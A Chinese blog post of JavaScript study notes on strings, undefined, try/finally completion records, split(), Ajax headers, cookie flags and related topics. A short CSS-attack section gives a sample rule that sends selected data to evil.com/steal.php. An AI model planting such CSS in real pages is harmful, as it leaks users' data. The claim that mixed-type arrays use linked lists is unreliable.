<p>虽然两种方式结果相同但是 way 2 的分隔条件可以节省 2 字节：使用数字来做为 split 的分隔条件可以节省 2 字节。</p>
<p>String 用于表示文本数据。String 有最大长度是 2^53 - 1，但 String 的意义并非“字符串”，而是字符串的 UTF16 编码，我们字符串的操作 charAt、charCodeAt、length 等方法针对的都是 UTF16 编码。所以，字符串的最大长度，实际上是受字符串的编码长度影响的。</p>
<blockquote>
<p>现行的字符集国际标准，字符是以 Unicode 的方式表示的，每一个 Unicode 的码点表示一个字符，理论上，Unicode 的范围是无限的。UTF 是 Unicode 的编码方式，规定了码点在计算机中的表示方法，常见的有 UTF16 和 UTF8。 Unicode 的码点通常用 U+??? 来表示，其中 ??? 是十六进制的码点值。 0-65536（U+0000 - U+FFFF）的码点被称为基本字符区域（BMP）。</p>
</blockquote>
<blockquote>
<p>JavaScript 中的字符串是永远无法变更的，一旦字符串构造出来，无法用任何方式改变字符串的内容，所以字符串具有值类型的特征。</p>
</blockquote>
<blockquote>
<p>JavaScript 字符串把每个 UTF16 单元当作一个字符来处理，所以处理非 BMP（超出 U+0000 - U+FFFF 范围）的字符时，你应该格外小心。</p>
</blockquote>
<blockquote>
<p>JavaScript 这个设计继承自 Java，最新标准中是这样解释的，这样设计是为了“性能和尽可能实现起来简单”。因为现实中很少用到 BMP 之外的字符。</p>
</blockquote>
<h3 id="45-赋值-Undefined-的偏方"><a href="#45-赋值-Undefined-的偏方" class="headerlink" title="45 赋值 Undefined 的偏方"></a>45 赋值 Undefined 的偏方</h3><h4 id="最推荐：void"><a href="#最推荐：void" class="headerlink" title="最推荐：void"></a>最推荐：<code>void</code></h4><p>如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">void</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h4 id="通过属性"><a href="#通过属性" class="headerlink" title="通过属性"></a>通过属性</h4><p>如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">''</span>._;</span><br><span class="line"><span class="keyword">let</span> b = (<span class="number">1</span>)._;</span><br><span class="line"><span class="keyword">let</span> c = (<span class="number">0</span>)[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<h3 id="try…catch…finally"><a href="#try…catch…finally" class="headerlink" title="try…catch…finally"></a>try…catch…finally</h3><p>有一个例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test 1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'finally'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果是 return 和 console.log 都执行了。</p>
<p>第二个例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test 2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果是返回 2。</p>
<p>这一机制的基础正是 JavaScript 语句执行的完成状态，我们用一个标准类型来表示：Completion Record（用于描述异常、跳出等语句执行过程）。</p>
<p>Completion Record 表示一个语句执行完之后的结果，它有三个字段：</p>
<ul>
<li><code>[[type]]</code>: 表示完成的类型，有 break continue return throw 和 normal 几种类型；</li>
<li><code>[[value]]</code>: 表示语句的返回值，如果语句没有，则是 empty；</li>
<li><code>[[target]]</code>: 表示语句的目标，通常是一个 JavaScript 标签（标签在后文会有介绍）。</li>
</ul>
<p>控制型语句带有 if、switch 关键字，它们会对不同类型的 Completion Record 产生反应。</p>
<p>控制类语句分成两部分，一类是对其内部造成影响，如 if、switch、while/for、try。另一类是对外部造成影响如 break、continue、return、throw，这两类语句的配合，会产生控制代码执行顺序和执行逻辑的效果，这也是我们编程的主要工作。</p>
<p>一般来说， for/while - break/continue 和 try - throw 这样比较符合逻辑的组合，是大家比较熟悉的，但是，实际上，我们需要控制语句跟 break 、continue 、return 、throw 四种类型与控制语句两两组合产生的效果。</p>
<table>
<thead>
<tr>
<th>语句/控制</th>
<th>break</th>
<th>continue</th>
<th>return</th>
<th>throw</th>
</tr>
</thead>
<tbody>
<tr>
<td>if</td>
<td>穿透</td>
<td>穿透</td>
<td>穿透</td>
<td>穿透</td>
</tr>
<tr>
<td>switch</td>
<td>消费</td>
<td>穿透</td>
<td>穿透</td>
<td>穿透</td>
</tr>
<tr>
<td>for/while</td>
<td>消费</td>
<td>消费</td>
<td>穿透</td>
<td>穿透</td>
</tr>
<tr>
<td>function</td>
<td>报错</td>
<td>报错</td>
<td>消费</td>
<td>穿透</td>
</tr>
<tr>
<td>try</td>
<td>特殊处理</td>
<td>特殊处理</td>
<td>特殊处理</td>
<td>消费</td>
</tr>
<tr>
<td>catch</td>
<td>特殊处理</td>
<td>特殊处理</td>
<td>特殊处理</td>
<td>穿透</td>
</tr>
<tr>
<td>finally</td>
<td>特殊处理</td>
<td>特殊处理</td>
<td>特殊处理</td>
<td>穿透</td>
</tr>
</tbody>
</table>
<p>因为 finally 中的内容必须保证执行，所以 try/catch 执行完毕，即使得到的结果是非 normal 型的完成记录，也必须要执行 finally。</p>
<p>而当 finally 执行也得到了非 normal 记录，则会使 finally 中的记录作为整个 try 结构的结果。</p>
<h3 id="46-为什么大多数编程语言中，数组要从-0-开始编号，而不是从-1-开始呢？"><a href="#46-为什么大多数编程语言中，数组要从-0-开始编号，而不是从-1-开始呢？" class="headerlink" title="46 为什么大多数编程语言中，数组要从 0 开始编号，而不是从 1 开始呢？"></a>46 为什么大多数编程语言中，数组要从 0 开始编号，而不是从 1 开始呢？</h3><p>从数组存储的内存模型上来看，“下标”最确切的定义应该是“偏移（offset）”。前面也讲到，如果用 a 来表示数组的首地址，<code>a[0]</code>就是偏移为 0 的位置，也就是首地址，<code>a[k]</code>就表示偏移 k 个 type_size 的位置，所以计算 a[k]的内存地址只需要用这个公式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[k]_address = base_address + k * type_size</span><br></pre></td></tr></table></figure>
<p>但是，如果数组从 1 开始计数，那我们计算数组元素 a[k]的内存地址就会变为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[k]_address = base_address + (k-1)*type_size</span><br></pre></td></tr></table></figure>
<p>对比两个公式，我们不难发现，从 1 开始编号，每次随机访问数组元素都多了一次减法运算，对于 CPU 来说，就是多了一次减法指令。</p>
<p>数组作为非常基础的数据结构，通过下标随机访问数组元素又是其非常基础的编程操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作，数组选择了从 0 开始编号，而不是从 1 开始。</p>
<h3 id="47-String-prototype-split-被我忽视的操作"><a href="#47-String-prototype-split-被我忽视的操作" class="headerlink" title="47 String.prototype.split()被我忽视的操作"></a>47 String.prototype.split()被我忽视的操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.split([separator[, limit]])</span><br></pre></td></tr></table></figure>
<p>其中参数：</p>
<ul>
<li>separator：<br>指定表示每个拆分应发生的点的字符串。separator 可以是一个字符串或正则表达式。 如果纯文本分隔符包含多个字符，则必须找到整个字符串来表示分割点。如果在 str 中省略或不出现分隔符，则返回的数组包含一个由整个字符串组成的元素。如果分隔符为空字符串，则将 str 原字符串中每个字符的数组形式返回。</li>
<li>limit：<br>一个整数，限定返回的分割片段数量。当提供此参数时，split 方法会在指定分隔符的每次出现时分割该字符串，但在限制条目已放入数组时停止。如果在达到指定限制之前达到字符串的末尾，它可能仍然包含少于限制的条目。新数组中不返回剩下的文本。</li>
</ul>
<p>直接看例子，分隔标识符可以传正则和数组：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// regexp</span></span><br><span class="line"><span class="keyword">var</span> myString = <span class="string">'Hello 1 word. Sentence number 2.'</span>;</span><br><span class="line"><span class="keyword">var</span> splits = myString.split(<span class="regexp">/(\d)/</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(splits);</span><br><span class="line"></span><br><span class="line"><span class="comment">// array</span></span><br><span class="line"><span class="keyword">const</span> myString = <span class="string">'ca,bc,a,bca,bca,bc'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> splits = myString.split([<span class="string">'a'</span>, <span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">// myString.split(['a','b']) is same as myString.split(String(['a','b']))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(splits); <span class="comment">//["c", "c,", "c", "c", "c"]</span></span><br></pre></td></tr></table></figure>
<h3 id="48-DOM-如何优雅得在-url-中添加来源-search"><a href="#48-DOM-如何优雅得在-url-中添加来源-search" class="headerlink" title="48 (DOM)如何优雅得在 url 中添加来源 search"></a>48 (DOM)如何优雅得在 url 中添加来源 search</h3><p>有这样一个需求，要在 url 中添加来源渠道号，用 frm 字段传递。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addOperator</span>(<span class="params">url, id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _link = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  _link.href = url;</span><br><span class="line">  _link.search = _link.search ? _link.search + <span class="string">'&amp;frm='</span> + id : <span class="string">'?frm='</span> + id;</span><br><span class="line">  <span class="keyword">return</span> _link.href;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="49-Ajax"><a href="#49-Ajax" class="headerlink" title="49 Ajax"></a>49 Ajax</h3><h4 id="49-1-不可以通过-js-设置的请求头"><a href="#49-1-不可以通过-js-设置的请求头" class="headerlink" title="49.1 不可以通过 js 设置的请求头"></a>49.1 不可以通过 js 设置的请求头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Accept-Charset</span><br><span class="line">Accept-Encoding</span><br><span class="line">Access-Control-Request-Headers</span><br><span class="line">Access-Control-Request-Method</span><br><span class="line">Connection</span><br><span class="line">Content-Length</span><br><span class="line">Cookie</span><br><span class="line">Cookie2</span><br><span class="line">Content-Transfer-Encoding</span><br><span class="line">Date</span><br><span class="line">Expect</span><br><span class="line">Host</span><br><span class="line">Keep-Alive</span><br><span class="line">Origin</span><br><span class="line">Referer</span><br><span class="line">TE</span><br><span class="line">Trailer</span><br><span class="line">Transfer-Encoding</span><br><span class="line">Upgrade</span><br><span class="line">User-Agent</span><br><span class="line">Via</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>获取所有合法的响应头：<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getAllResponseHeaders" target="_blank" rel="noopener">XMLHttpRequest/getAllResponseHeaders</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'GET'</span>, <span class="string">'foo.txt'</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send();</span><br><span class="line"></span><br><span class="line">xhr.getAllResponseHeaders();</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">"connection: keep-alive</span></span><br><span class="line"><span class="comment">content-length: 146</span></span><br><span class="line"><span class="comment">content-security-policy: default-src 'none'</span></span><br><span class="line"><span class="comment">content-type: text/html; charset=utf-8</span></span><br><span class="line"><span class="comment">date: Thu, 09 Apr 2020 05:14:05 GMT</span></span><br><span class="line"><span class="comment">x-content-type-options: nosniff</span></span><br><span class="line"><span class="comment">x-powered-by: Express"</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h4 id="49-2-cookie-HttpOnly，Secure-Cookie"><a href="#49-2-cookie-HttpOnly，Secure-Cookie" class="headerlink" title="49.2 cookie HttpOnly，Secure Cookie"></a>49.2 cookie HttpOnly，Secure Cookie</h4><p>HttpOnly 是指仅在 HTTP 层面上传输的 Cookie，当设置了 HttpOnly 标志后，客户端脚本就无法读写该 Cookie，这样能有效地防御 XSS 攻击获取 Cookie。</p>
<p>Secure Cookie 机制指的是设置了 Secure 标志的 Cookie 仅在 HTTPS 层面上安全传输，如果请求是 HTTP 的，就不会带上这个 Cookie，这样就能降低重要的 Cookie 被中间人截获的风险。不过对于客户端脚本来说 Secure Cookie 是可读写的。</p>
<h4 id="49-3-CSS-攻击"><a href="#49-3-CSS-攻击" class="headerlink" title="49.3 CSS 攻击"></a>49.3 CSS 攻击</h4><p>如：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn</span><span class="selector-attr">[type^=<span class="string">'safe_'</span>]</span>,</span><br><span class="line"><span class="selector-class">.btn</span><span class="selector-pseudo">::selection</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(http://www.evil.com/css/steal.php?data=selection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="50-Array-与内存"><a href="#50-Array-与内存" class="headerlink" title="50. Array 与内存"></a>50. Array 与内存</h3><p>在大多数计算机语言中，数组都对应着一段连续的内存。如果我们想要在任意位置删除一个元素，那么该位置往后的所有元素都需要往前挪一个位置。相应地，如果要在任意位置新增一个元素，那么该位置往后的所有元素也都要往后挪一个位置。时间复杂度为<code>O(n)</code></p>
<p>但是呢 js 中不一定，比如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br></pre></td></tr></table></figure>
<p>这样一个纯数字数组，它对应的确实是连续内存。<br>但如果我们定义了不同类型的元素：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'abc'</span>, <span class="number">1</span>, &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;];</span><br></pre></td></tr></table></figure>
<p>这样一个数组对应的就是一段非连续的内存。其底层是由链表来实现的。</p>
<h3 id="51-navigator-onLine-检验网络在线状态"><a href="#51-navigator-onLine-检验网络在线状态" class="headerlink" title="51.navigator.onLine 检验网络在线状态"></a>51.navigator.onLine 检验网络在线状态</h3><p>navigator.onLine 属性返回一个布尔值（<code>true/false</code>），代表是否在线。一旦浏览器的联网状态发生改变，该属性值也会随之变化。<br>对应还有监听事件，如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logOnlineStatus</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(navigator.onLine ? <span class="string">'在线'</span> : <span class="string">'不在线'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'online'</span>, logOnlineStatus);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'offline'</span>, logOnlineStatus);</span><br></pre></td></tr></table></figure>
<p><a href="https://caniuse.com/?search=onLine" target="_blank" rel="noopener">兼容情况&gt;&gt;</a>：基本全兼容。不过有个核心的问题，初始如果是 offline 的话，js 也不会加载到，然后就走不进监听中。</p>
<h3 id="0-fn"><a href="#0-fn" class="headerlink" title="(0,fn)()"></a><code>(0,fn)()</code></h3><p>babel 执行时会把模块函数的执行修改为(0,_b.a)()。原因是为了保证函数执行时的 this 指向：由于逗号操作符，会把最右边的赋值给（）里，即(0,_b.a)();等价于 varmethod=_b.a；然后立即执行，method（）;此时执行 a 方法的对象已经变为 window 了。a 中的 this 都指向 window 了。</p>
</div></article></div><div class="post-paginator"><div class="post-links"><div class="post-prev"><a href="/2019/07/18/tools_study/【工具】前端动画解决方案Lottie（web篇）/" class="prev">Previous Post<span>【工具】前端动画解决方案Lottie（web篇）</span></a></div><div class="post-next"><a href="/2019/07/06/notes/【笔记】BadSmellsinCode代码异味/" class="next">Next Post<span>【笔记】Bad smells in code代码异味</span></a></div></div></div></div><div class="sidebar"><div class="social-links"><ul><li class="social-link"><a href="http://github.com/MichealWayne" target="_blank" class="link-github"><i class="icon icon-github"></i></a></li><li class="social-link"><a href="mailto:michealwayne@163.com" target="_self" class="link-mail"><i class="icon icon-mail"></i></a></li></ul></div><div class="recent-posts widget"><h3 class="widget-title"> Recent Posts</h3><div class="widget-content"><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/12/10/notes/【笔记】《演进式架构》（一）/">【笔记】《演进式架构》学习笔记（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/19/typescript/浅谈TypeScript的图灵完备性/">浅谈TypeScript的图灵完备性</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/23/notes/【笔记】《我的架构思想：基本模型、理论与原则》编三/">【笔记】《我的架构思想：基本模型、理论与原则》编三——架构原则，技艺、艺术与美</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/04/notes/【笔记】《我的架构思想：基本模型、理论与原则》编二/">【笔记】《我的架构思想：基本模型、理论与原则》编二——架构是过程，而非结果</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/12/notes/【笔记】《我的架构思想：基本模型、理论与原则》编一/">【笔记】《我的架构思想：基本模型、理论与原则》编一——你所关注的系统</a></li></ul></div></div><div class="recent-comment widget"><h3 class="widget-title"> Author</h3><div class="widget-content"><div class="m-author"><div class="u-avatar"><img src="data:image/jpeg;base64,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